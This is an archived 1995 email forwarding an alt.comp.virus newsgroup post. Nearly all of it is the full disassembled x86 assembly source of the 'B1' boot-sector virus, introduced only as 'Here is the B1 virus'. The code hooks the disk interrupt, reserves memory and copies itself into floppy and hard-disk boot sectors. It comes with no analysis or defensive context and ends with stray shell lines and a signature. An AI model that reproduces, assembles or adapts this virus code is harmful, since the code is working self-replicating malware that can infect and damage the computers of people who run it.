From smtp Tue Feb  7 13:16 EST 1995
Received: from lynx.dac.neu.edu by POBOX.jwu.edu; Tue,  7 Feb 95 13:16 EST
Received: by lynx.dac.neu.edu (8.6.9/8.6.9) 
     id NAA01723 for joshuaw@pobox.jwu.edu; Tue, 7 Feb 1995 13:19:13 -0500
Date: Tue, 7 Feb 1995 13:19:13 -0500
From: lynx.dac.neu.edu!ekilby (Eric Kilby)
Content-Length: 10347
Content-Type: binary
Message-Id: <199502071819.NAA01723@lynx.dac.neu.edu>
To: pobox.jwu.edu!joshuaw 
Subject: (fwd) B1
Newsgroups: alt.comp.virus
Status: O

Path: chaos.dac.neu.edu!usenet.eel.ufl.edu!news.bluesky.net!news.sprintlink.net!uunet!ankh.iia.org!danishm
From: danishm@iia.org ()
Newsgroups: alt.comp.virus
Subject: B1
Date: 5 Feb 1995 22:05:37 GMT
Organization: International Internet Association.
Lines: 330
Message-ID: <3h3i3h$v4@ankh.iia.org>
NNTP-Posting-Host: iia.org
X-Newsreader: TIN [version 1.2 PL2]

Here is the B1 virus:

  
PAGE  59,132
; Disassembled using sourcer  
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
;[[                                                                      [[
;[[                             B1                                       [[
;[[                                                                      [[
;[[      Created:   8-Jan-95                                             [[
;[[      Version:                                                        [[
;[[      Code type: zero start                                           [[
;[[      Passes:    5          Analysis Options on: none                 [[
;[[                                                                      [[
;[[                                                                      [[
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
  
data_1e         equ     413h                    ; (0000:0413=7Fh)
data_2e         equ     46Dh                    ; (0000:046D=17E1h)
data_3e         equ     4Ch                     ; (0006:004C=0DAh)
  
seg_a           segment byte public
		assume  cs:seg_a, ds:seg_a
  
  
		org     0
  
virus           proc    far
  
start:
		jmp     short loc_2             ; (0040)
		db       90h, 00h, 4Dh, 4Dh, 49h, 00h
		db       33h, 2Eh, 33h, 00h, 02h, 01h
		db       01h, 00h, 02h,0E0h, 00h, 40h
		db       0Bh,0F0h, 09h, 00h, 12h, 00h
		db       02h, 00h
		db      19 dup (0)
		db       12h, 00h, 00h, 00h, 00h, 01h
		db       00h,0FAh, 33h,0C0h, 8Eh,0D0h
		db      0BCh, 00h, 7Ch, 16h, 07h
loc_2:
		push    cs
		call    sub_1                   ; (00EF)
		push    ax
		shr     ax,1                    ; Shift w/zeros fill
		dec     ah
		jz      loc_3                   ; Jump if zero
		jmp     loc_14                  ; (01BA)
loc_3:
		push    bx
		push    cx
		push    dx
		push    es
		push    si
		push    di
		push    ds
		push    bp
		mov     bp,sp
		or      ch,ch                   ; Zero ?
		jnz     loc_5                   ; Jump if not zero
		shl     al,1                    ; Shift w/zeros fill
		jc      loc_4                   ; Jump if carry Set
		call    sub_6                   ; (0190)
		call    sub_4                   ; (017B)
		jc      loc_7                   ; Jump if carry Set
		call    sub_2                   ; (0127)
		jz      loc_4                   ; Jump if zero
		call    sub_6                   ; (0190)
		call    sub_3                   ; (013B)
		jz      loc_5                   ; Jump if zero
		inc     ah
		call    sub_4                   ; (017B)
		jc      loc_5                   ; Jump if carry Set
		call    sub_5                   ; (0182)
		call    sub_6                   ; (0190)
		inc     ah
		call    sub_4                   ; (017B)
loc_4:
		call    sub_7                   ; (019E)
		or      ch,dh
		dec     cx
		jnz     loc_5                   ; Jump if not zero
		call    sub_6                   ; (0190)
		call    sub_4                   ; (017B)
		jc      loc_7                   ; Jump if carry Set
		call    sub_2                   ; (0127)
		jnz     loc_5                   ; Jump if not zero
		call    sub_7                   ; (019E)
		call    sub_3                   ; (013B)
		dec     byte ptr [bp+10h]
		jz      loc_6                   ; Jump if zero
		mov     al,1
		call    sub_4                   ; (017B)
		jc      loc_7                   ; Jump if carry Set
		call    sub_7                   ; (019E)
		add     bx,di
		inc     cl
		jmp     short loc_6             ; (00BA)
loc_5:
		call    sub_7                   ; (019E)
loc_6:
		call    sub_4                   ; (017B)
loc_7:
		pushf                           ; Push flags
		pop     bx
		mov     [bp+16h],bx
		xchg    ax,[bp+10h]
		shr     ah,1                    ; Shift w/zeros fill
		jnc     loc_9                   ; Jump if carry=0
		xor     ax,ax                   ; Zero register
		mov     ds,ax
		mov     ax,ds:data_2e           ; (0000:046D=17E1h)
		and     ax,178Fh
		jnz     loc_9                   ; Jump if not zero
		call    sub_6                   ; (0190)
loc_8:
		push    ax
		call    sub_4                   ; (017B)
		xor     cx,0FFC0h
		nop                             ;*ASM fixup - sign extn byte
		shl     ax,1                    ; Shift w/zeros fill
		pop     ax
		jnc     loc_8                   ; Jump if carry=0
loc_9:
		pop     bp
		pop     ds
		pop     di
		pop     si
		pop     es
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		iret                            ; Interrupt return
  
virus           endp
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_1           proc    near
		mov     bx,44h
		mov     dx,80h
		mov     si,data_1e              ; (0000:0413=7Fh)
		xor     di,di                   ; Zero register
		mov     ds,di
		dec     word ptr [si]
		lodsw                           ; String [si] to ax
		pop     si
		mov     cl,6
		shl     ax,cl                   ; Shift w/zeros fill
		mov     es,ax
		sub     si,bx
		push    si
		push    ax
		mov     ax,1AEh
		push    ax
		push    cs
		push    si
		push    cs
		pop     ds
		call    sub_5                   ; (0182)
		mov     ds,cx
		mov     si,data_3e              ; (0006:004C=0DAh)
		mov     cl,2
		rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
		mov     [si-4],bx
		mov     [si-2],es
		pop     bx
		pop     es
		retf                            ; Return far
sub_1           endp
  
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_2           proc    near
		cld                             ; Clear direction
		push    cs
		pop     ds
		xor     si,si                   ; Zero register
		mov     di,bx
		mov     cl,40h                  ; '@'
		push    si
		push    di
		add     si,cx
		add     di,cx
		repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
		pop     di
		pop     si
		retn
sub_2           endp
  
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_3           proc    near
		push    ax
		xor     dh,dh                   ; Zero register
		test    dl,80h
		jz      loc_10                  ; Jump if zero
		mov     cx,11h
		jmp     short loc_11            ; (0175)
loc_10:
		mov     ax,[di+11h]
		mov     cl,4
		shr     ax,cl                   ; Shift w/zeros fill
		mov     cx,ax
		mov     ax,[di+16h]
		shl     ax,1                    ; Shift w/zeros fill
		jc      loc_12                  ; Jump if carry Set
		add     ax,cx
		jc      loc_12                  ; Jump if carry Set
		xor     cx,cx                   ; Zero register
		cmp     ah,[di+18h]
		jae     loc_12                  ; Jump if above or =
		div     byte ptr [di+18h]       ; al,ah rem = ax/data
		xchg    cl,ah
		cmp     ah,[di+1Ah]
		jae     loc_12                  ; Jump if above or =
		div     byte ptr [di+1Ah]       ; al,ah rem = ax/data
		mov     ch,al
		mov     dh,ah
		inc     cx
loc_11:
		pop     ax
		retn
loc_12:
		xor     cx,cx                   ; Zero register
		jmp     short loc_11            ; (0175)
sub_3           endp
  
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_4           proc    near
		pushf                           ; Push flags
		call    dword ptr cs:[1BCh]     ; (7379:01BC=0D79h)
		retn
sub_4           endp
  
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_5           proc    near
		cld                             ; Clear direction
		movsw                           ; Mov [si] to es:[di]
		mov     cx,17Ch
		add     si,3Eh
		add     di,3Eh
		rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
		retn
sub_5           endp
  
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_6           proc    near
		push    cs
		mov     ax,200h
		mov     bx,ax
		xor     cx,cx                   ; Zero register
		xor     dh,dh                   ; Zero register
		inc     cx
		inc     ax
		pop     es
		retn
sub_6           endp
  
  
;__________________________________________________________________________
;                              SUBROUTINE
;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  
sub_7           proc    near
		mov     ax,[bp+10h]
		mov     bx,[bp+0Eh]
		mov     cx,[bp+0Ch]
		mov     dx,[bp+0Ah]
		mov     es,[bp+8]
		retn
sub_7           endp
  
		db      41h                     ; Inc   cx   ?
loc_13:
		mov     ax,201h
		int     13h                     ; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
		xor     dl,80h
		jz      loc_13                  ; Jump if zero
		retf                            ; Return far
loc_14:
		pop     ax
;*              jmp     far ptr loc_1           ;*(000A:0D79)
		db      0EAh, 79h, 0Dh, 0Ah, 00h
		db      0Dh, 0Ah, 'Disk Boot failure', 0Dh
		db      0Ah, 0
		db      'IBMBIO  COMIBMDOS  COM'
		db      18 dup (0)
		db       55h,0AAh
  
seg_a           ends
  
  
  
		end     start

ls virus.asm



ls virus.asm








--
Eric "Mad Dog" Kilby                                 maddog@ccs.neu.edu
The Great Sporkeus Maximus			     ekilby@lynx.dac.neu.edu
Student at the Northeatstern University College of Computer Science 
"I Can't Believe It's Not Butter"

